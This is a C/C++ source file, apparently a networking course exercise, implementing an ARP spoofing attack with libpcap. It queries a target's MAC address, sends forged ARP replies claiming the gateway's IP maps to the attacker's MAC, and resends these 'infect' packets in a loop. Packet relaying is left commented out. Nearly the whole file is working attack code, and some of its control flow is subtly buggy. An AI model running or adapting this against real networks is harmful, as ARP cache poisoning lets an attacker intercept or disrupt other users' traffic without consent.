#include "ethh.h"
#include "arph.h"
#include "ip.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

int main(int argc, char *argv[]){

    struct etharpPacket{
        ethH eth;
        arpH arp;
    };

    etharpPacket packet;
    pcap_pkthdr* header;
    char err[PCAP_BUF_SIZE];

    pcap_t* pcap = pcap_open_live(argv[1],BUFSIZ,1,1000,err);

    //my mac
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strcpy(ifr.ifr_name, argv[1]);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    uint8_t mac[6];
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    char myMac[18];
    sprintf(myMac, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    //my ip
    ioctl(fd, SIOCGIFADDR, &ifr);
    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
    char *myIp = inet_ntoa(addr->sin_addr);

    close(fd);



    packet.eth.dmac = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth.smac = Mac(myMac);
    packet.eth.etype = htons(0x0806);

    packet.arp.h_type = htons(0x0001);
    packet.arp.p_type = htons(0x0800);
    packet.arp.h_length = 0x06;
    packet.arp.p_length = 0x04;
    packet.arp.op_code = htons(0x0001);
    packet.arp.smac = Mac(myMac);
    packet.arp.tmac = Mac("00:00:00:00:00:00");
    packet.arp.sip = htonl(Ip(myIp));
    packet.arp.tip = htonl(Ip(argv[2]));

    pcap_sendpacket(pcap, reinterpret_cast<u_char*>(&packet), sizeof(etharpPacket));

    const u_char* packet_data_1;
    pcap_next_ex(pcap, &header, &packet_data_1);

    etharpPacket* recv_packet_1 = (etharpPacket*)packet_data_1;
    const u_char* packet_data_2;
    //first infect
    packet.eth.smac = Mac(myMac);
    packet.eth.dmac = recv_packet_1->arp.smac;
    packet.eth.etype = htons(0x0806);//arp

    packet.arp.h_type = htons(0x0001);//ethernet
    packet.arp.p_type = htons(0x0800);//ipv4
    packet.arp.h_length = 0x06; //mac
    packet.arp.p_length = 0x04; //ipv4
    packet.arp.op_code = htons(0x0002); //reply
    packet.arp.smac = Mac(myMac);

    packet.arp.sip = htonl(Ip(argv[3]));
    packet.arp.tmac = recv_packet_1->arp.smac;
    packet.arp.tip = htonl(Ip(myIp));

    pcap_sendpacket(pcap,reinterpret_cast<u_char*>(&packet),sizeof(etharpPacket));

    //exception
    while(true){
        pcap_next_ex(pcap,&header,&packet_data_2);
        etharpPacket* recv_packet_2 = (etharpPacket*)packet_data_2;



        //arp check
        if (recv_packet_2->eth.etype == htons(0x0806)) {
            //broadcast check
            /*if (memcmp(recv_packet_2->eth.dmac.mac,Mac("ff:ff:ff:ff:ff:ff").mac,6)){
            if (recv_packet_2->arp.tip != Ip(argv[3])){
                continue;
            }
        }*/
            //ask gateway
            if (recv_packet_2->arp.op_code == htons(0x0001)){
                if (recv_packet_2->arp.sip == htonl(Ip(argv[2]))){
                    if (recv_packet_2->arp.tip == htonl(Ip(argv[3])))
                    usleep(500000);
                    packet.eth.smac = Mac(myMac);
                    packet.eth.dmac = recv_packet_1->arp.smac;
                    packet.eth.etype = htons(0x0806);//arp

                    packet.arp.h_type = htons(0x0001);//ethernet
                    packet.arp.p_type = htons(0x0800);//ipv4
                    packet.arp.h_length = 0x06; //mac
                    packet.arp.p_length = 0x04; //ipv4
                    packet.arp.op_code = htons(0x0002); //reply
                    packet.arp.smac = Mac(myMac);

                    packet.arp.sip = htonl(Ip(argv[3]));
                    packet.arp.tmac = recv_packet_1->arp.smac;
                    packet.arp.tip = htonl(Ip(myIp));
                }
            }

        }
        else {
            continue;
        }

        /*else if (recv_packet_2->eth.etype == htons(0x0800)){
            packet_relay();
        }*/

        pcap_sendpacket(pcap,reinterpret_cast<u_char*>(&packet),sizeof(etharpPacket));


        printf("send infect packet");
        sleep(1);
    }


    pcap_close(pcap);

}
